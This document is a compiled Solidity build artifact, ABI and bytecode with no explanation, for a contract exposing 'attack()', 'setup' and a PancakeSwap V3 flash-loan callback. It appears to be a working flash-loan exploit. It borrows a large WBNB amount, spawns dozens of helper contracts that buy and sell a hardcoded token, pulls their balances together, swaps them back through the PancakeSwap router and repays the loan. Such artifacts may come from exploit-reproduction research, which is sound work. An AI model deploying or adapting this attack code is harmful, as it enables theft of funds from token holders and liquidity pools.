{"abi":[{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"pancakeV3FlashCallback","inputs":[{"name":"fee0","type":"uint256","internalType":"uint256"},{"name":"fee1","type":"uint256","internalType":"uint256"},{"name":"data","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"setup","inputs":[{"name":"_myToken","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50610f108061001c5f395ff3fe608060405260043610610036575f3560e01c806366d38203146100415780639e5faafc14610062578063a1d4833614610076575f5ffd5b3661003d57005b5f5ffd5b34801561004c575f5ffd5b5061006061005b366004610a85565b610095565b005b34801561006d575f5ffd5b50610060610187565b348015610081575f5ffd5b50610060610090366004610ab2565b610212565b5f80546001600160a01b0319166001600160a01b0383161781555b60218110156101185760016040516100c790610a78565b604051809103905ff0801580156100e0573d5f5f3e3d5ffd5b508154600180820184555f93845260209093200180546001600160a01b0319166001600160a01b0392909216919091179055016100b0565b505f5b606481101561018357600260405161013290610a78565b604051809103905ff08015801561014b573d5f5f3e3d5ffd5b508154600180820184555f93845260209093200180546001600160a01b0319166001600160a01b03929092169190911790550161011b565b5050565b6040516312439b2f60e21b81523060048201525f602482015268d8d726b7177a80000060448201526080606482015260206084820152600160a482015273172fcd41e0913e95784454622d1c3724f546f8499063490e6cbc9060c4015f604051808303815f87803b1580156101fa575f5ffd5b505af115801561020c573d5f5f3e3d5ffd5b50505050565b604051632e1a7d4d60e01b815268d8d726b7177a800000600482015273bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c90632e1a7d4d906024015f604051808303815f87803b158015610264575f5ffd5b505af1158015610276573d5f5f3e3d5ffd5b505050505f5b600e811015610313575f60405161029290610a78565b604051809103905ff0801580156102ab573d5f5f3e3d5ffd5b509050806001600160a01b031663a6f2ae3a678ac7230489e800006040518263ffffffff1660e01b81526004015f604051808303818588803b1580156102ef575f5ffd5b505af1158015610301573d5f5f3e3d5ffd5b50506001909401935061027c92505050565b505f5b6001548110156103a9576001818154811061033357610333610b2e565b5f91825260208220015460408051635379571d60e11b815290516001600160a01b039092169263a6f2ae3a9268056bc75e2d6310000092600480820193929182900301818588803b158015610386575f5ffd5b505af1158015610398573d5f5f3e3d5ffd5b505060019093019250610316915050565b505f6040516103b790610a78565b604051809103905ff0801580156103d0573d5f5f3e3d5ffd5b5090505f5b60015481101561055657736beee2b57b064eac5f432fc19009e3e78734eabc6001600160a01b03166323b872dd6001838154811061041557610415610b2e565b905f5260205f20015f9054906101000a90046001600160a01b031684736beee2b57b064eac5f432fc19009e3e78734eabc6001600160a01b03166370a082316001878154811061046757610467610b2e565b5f9182526020909120015460405160e083901b6001600160e01b03191681526001600160a01b039091166004820152602401602060405180830381865afa1580156104b4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104d89190610b42565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303815f875af1158015610529573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061054d9190610b59565b506001016103d5565b506040516370a0823160e01b81526001600160a01b03821660048201525f90736beee2b57b064eac5f432fc19009e3e78734eabc906370a0823190602401602060405180830381865afa1580156105af573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105d39190610b42565b90505f5b60025481101561073b57736beee2b57b064eac5f432fc19009e3e78734eabc6001600160a01b03166323b872dd846002848154811061061857610618610b2e565b5f918252602090912001546001600160a01b0316610637606487610b8c565b6040516001600160e01b031960e086901b1681526001600160a01b03938416600482015292909116602483015260448201526064016020604051808303815f875af1158015610688573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106ac9190610b59565b50600281815481106106c0576106c0610b2e565b5f918252602090912001546001600160a01b031663e4849b326106e4606485610b8c565b6040518263ffffffff1660e01b815260040161070291815260200190565b5f604051808303815f87803b158015610719575f5ffd5b505af115801561072b573d5f5f3e3d5ffd5b5050600190920191506105d79050565b5073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c6001600160a01b031663d0e30db0476040518263ffffffff1660e01b81526004015f604051808303818588803b158015610789575f5ffd5b505af115801561079b573d5f5f3e3d5ffd5b50506040516370a0823160e01b81523060048201525f935073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c92506370a082319150602401602060405180830381865afa1580156107ef573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108139190610b42565b60405163095ea7b360e01b81527310ed43c718714eb63d5aa57b78b54704e256024e60048201525f19602482015290915073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c9063095ea7b3906044016020604051808303815f875af115801561087f573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108a39190610b59565b506040805160028082526060820183525f9260208301908036833701905050905073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c815f815181106108eb576108eb610b2e565b6001600160a01b0392831660209182029290920101525f5482519116908290600190811061091b5761091b610b2e565b6001600160a01b03909216602092830291909101909101527310ed43c718714eb63d5aa57b78b54704e256024e635c11d7958861096168d8d726b7177a80000086610bab565b61096b9190610bab565b5f8430426040518663ffffffff1660e01b815260040161098f959493929190610bc4565b5f604051808303815f87803b1580156109a6575f5ffd5b505af11580156109b8573d5f5f3e3d5ffd5b5073bb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c925063a9059cbb915073172fcd41e0913e95784454622d1c3724f546f8499050610a018a68d8d726b7177a800000610c34565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303815f875af1158015610a49573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a6d9190610b59565b505050505050505050565b61029380610c4883390190565b5f60208284031215610a95575f5ffd5b81356001600160a01b0381168114610aab575f5ffd5b9392505050565b5f5f5f5f60608587031215610ac5575f5ffd5b8435935060208501359250604085013567ffffffffffffffff811115610ae9575f5ffd5b8501601f81018713610af9575f5ffd5b803567ffffffffffffffff811115610b0f575f5ffd5b876020828401011115610b20575f5ffd5b949793965060200194505050565b634e487b7160e01b5f52603260045260245ffd5b5f60208284031215610b52575f5ffd5b5051919050565b5f60208284031215610b69575f5ffd5b81518015158114610aab575f5ffd5b634e487b7160e01b5f52601160045260245ffd5b5f82610ba657634e487b7160e01b5f52601260045260245ffd5b500490565b81810381811115610bbe57610bbe610b78565b92915050565b5f60a0820187835286602084015260a0604084015280865180835260c0850191506020880192505f5b81811015610c145783516001600160a01b0316835260209384019390920191600101610bed565b50506001600160a01b039590951660608401525050608001529392505050565b80820180821115610bbe57610bbe610b7856fe6080604081905263095ea7b360e01b9052336084525f1960a452736beee2b57b064eac5f432fc19009e3e78734eabc63095ea7b360c46020604051808303815f875af11580156050573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190607291906077565b50609b565b5f602082840312156086575f5ffd5b815180151581146094575f5ffd5b9392505050565b6101eb806100a85f395ff3fe60806040526004361061002b575f3560e01c8063a6f2ae3a14610036578063e4849b3214610040575f5ffd5b3661003257005b5f5ffd5b61003e61005f565b005b34801561004b575f5ffd5b5061003e61005a366004610178565b6100b5565b604051736beee2b57b064eac5f432fc19009e3e78734eabc9034905f81818185875af1925050503d805f81146100b0576040519150601f19603f3d011682016040523d82523d5f602084013e505050565b505050565b60405163a9059cbb60e01b8152736beee2b57b064eac5f432fc19009e3e78734eabc60048201819052602482018390529063a9059cbb906044016020604051808303815f875af115801561010b573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012f919061018f565b50604051339047905f81818185875af1925050503d805f811461016d576040519150601f19603f3d011682016040523d82523d5f602084013e610172565b606091505b50505050565b5f60208284031215610188575f5ffd5b5035919050565b5f6020828403121561019f575f5ffd5b815180151581146101ae575f5ffd5b939250505056fea2646970667358221220c2c564bca17cf93f5301188d836b88b591a8f99446cd865b3eeaafb7651eb08a64736f6c634300081c0033a2646970667358221220486b56ad71df82faad3212194e5a0632a0fc1e5062903beaf9e4aa1c2c5c36e964736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","pancakeV3FlashCallback(uint256,uint256,bytes)":"a1d48336","setup(address)":"66d38203"},"id":550}